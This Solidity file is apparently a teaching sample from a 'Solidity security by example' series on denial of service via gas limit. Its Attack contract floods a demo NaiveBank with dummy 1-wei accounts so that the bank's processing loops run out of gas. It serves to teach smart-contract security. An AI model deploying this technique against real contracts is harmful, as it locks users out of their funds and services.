// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-security-by-example-10-denial-of-service-with-gas-limit-346e87e2ef78
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-10-denial-of-service-with-gas-limit/

pragma solidity 0.8.19;

interface INaiveBank {
    function depositFor(address _user) external payable;
}

contract Attack {
    INaiveBank public immutable naiveBank;
    uint160 public dummyAccountCount;

    constructor(INaiveBank _naiveBank) {
        naiveBank = _naiveBank;
    }

    function openDummyAccounts(uint160 _noAccounts) external payable {
        require(msg.value == _noAccounts, "Invalid Ether amount");

        for (uint160 i = 0; i < _noAccounts; i++) {
            // Open a dummy account with the 1 wei deposit
            naiveBank.depositFor{value: 1}(address(++dummyAccountCount));
        }
    }
}